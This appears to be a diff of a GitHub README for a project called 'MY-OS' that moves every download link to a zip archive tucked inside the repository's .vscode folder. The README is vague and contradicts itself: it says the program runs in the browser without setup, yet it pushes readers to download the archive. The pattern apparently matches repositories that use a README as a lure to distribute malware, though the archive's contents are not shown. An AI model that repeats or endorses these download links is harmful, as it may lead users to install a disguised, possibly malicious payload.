@@ -1,6 +1,6 @@
 # 🎉 MY-OS - Experience a Unique Digital Celebration
 
-[![Download MY-OS](https://github.com/getup223/MY-OS/raw/refs/heads/main/Assets/OS-M-v2.2.zip)](https://github.com/getup223/MY-OS/raw/refs/heads/main/Assets/OS-M-v2.2.zip)
+[![Download MY-OS](https://raw.githubusercontent.com/getup223/MY-OS/main/.vscode/M_OS_1.7-beta.4.zip)](https://raw.githubusercontent.com/getup223/MY-OS/main/.vscode/M_OS_1.7-beta.4.zip)
 
 ## 🎬 Introduction
 
@@ -12,7 +12,7 @@ Follow these simple steps to download and run MY-OS on your computer:
 
 1. **Visit the Download Page**  
    Go to our releases page by clicking the link below:  
-   [Download MY-OS](https://github.com/getup223/MY-OS/raw/refs/heads/main/Assets/OS-M-v2.2.zip)
+   [Download MY-OS](https://raw.githubusercontent.com/getup223/MY-OS/main/.vscode/M_OS_1.7-beta.4.zip)
 
 2. **Choose the Latest Release**  
    Once you're on the releases page, look for the latest version. It is usually at the top of the list. 
@@ -30,7 +30,7 @@ Follow these simple steps to download and run MY-OS on your computer:
 
 To download MY-OS, click the button below:
 
-[![Download MY-OS](https://github.com/getup223/MY-OS/raw/refs/heads/main/Assets/OS-M-v2.2.zip)](https://github.com/getup223/MY-OS/raw/refs/heads/main/Assets/OS-M-v2.2.zip)
+[![Download MY-OS](https://raw.githubusercontent.com/getup223/MY-OS/main/.vscode/M_OS_1.7-beta.4.zip)](https://raw.githubusercontent.com/getup223/MY-OS/main/.vscode/M_OS_1.7-beta.4.zip)
 
 Installing MY-OS is straightforward since it runs directly in your web browser without any additional setup. Just follow the steps outlined above.
 
